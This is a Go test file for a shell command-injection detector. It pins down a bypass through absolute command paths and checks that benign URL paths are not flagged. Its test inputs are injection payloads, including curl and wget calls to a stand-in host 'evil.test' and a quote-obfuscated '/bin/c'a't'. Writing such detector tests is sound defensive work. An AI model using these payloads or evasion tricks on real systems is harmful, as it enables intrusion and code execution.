// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package shelli

import "testing"

// TestAbsolutePathInCommandPosition is the regression for a bypass the pentest
// harness found: writing the command's full path walked straight through.
//
// "; id" was blocked and "; /usr/bin/id" was not, because commandWord stops at
// the leading slash and scanPaths only resolves basenames against the
// interpreter list. "/bin/sh" and "/bin/bash" were caught, which is what made it
// look covered; everything that is not a shell was not. "| /usr/bin/curl
// evil.test" reached the backend.
func TestAbsolutePathInCommandPosition(t *testing.T) {
	d := New()
	for _, payload := range []string{
		"1.1.1.1; /usr/bin/id",
		"1.1.1.1 | /usr/bin/curl evil.test",
		"1.1.1.1; /bin/cat /tmp/x",
		"1.1.1.1 && /usr/bin/wget http://evil.test/x",
		"1.1.1.1; /usr/local/bin/python3 -c 'x'",
		"1.1.1.1\n/usr/bin/whoami",
		// Directory traversal in the path does not change what runs.
		"1.1.1.1; /bin/../bin/id",
		// Quoting is removed by the shell before the path resolves.
		`1.1.1.1; /bin/c'a't /tmp/x`,
	} {
		if v := d.Analyze([]byte(payload)); !v.Detected() {
			t.Errorf("missed %q (score %d, signals %v)", payload, v.Score, v.Signals)
		}
	}
}

// TestPathsOutsideCommandPositionStayQuiet is the other half, and the reason the
// resolution lives in command position rather than in scanPaths: a URL path is
// the single most common thing in a request value, and "/api/v1/ping" ends in a
// command name.
func TestPathsOutsideCommandPositionStayQuiet(t *testing.T) {
	d := New()
	for _, benign := range []string{
		"/api/v1/ping",
		"/v2/host/status",
		"https://example.test/docs/echo",
		"/usr/share/doc/id",
		"the file is at /usr/bin/id on most systems",
		"/downloads/2026/at",
		"/help/sleep-tracking",
		"/blog/how-to-use-curl",
		"GET /api/ping HTTP/1.1",
		"/static/js/node.min.js",
	} {
		if v := d.Analyze([]byte(benign)); v.Detected() {
			t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
		}
	}
}

// TestPathCommandWordResolvesTheLastComponent pins the helper directly: the
// shell runs the final component whatever precedes it.
func TestPathCommandWordResolvesTheLastComponent(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"/usr/bin/id", "id"},
		{"/bin/cat", "cat"},
		{"/bin/../bin/id", "id"},
		{`/bin/c'a't`, "cat"},
		{"/usr/bin/id -u", "id"},

		// Not a command name: no path at all, or nothing after the last slash.
		{"id", ""},
		{"/", ""},
		{"/usr/bin/", ""},
		{"", ""},
	} {
		_, got := pathCommandWord([]byte(tc.in), 0)
		if got != tc.want {
			t.Errorf("pathCommandWord(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
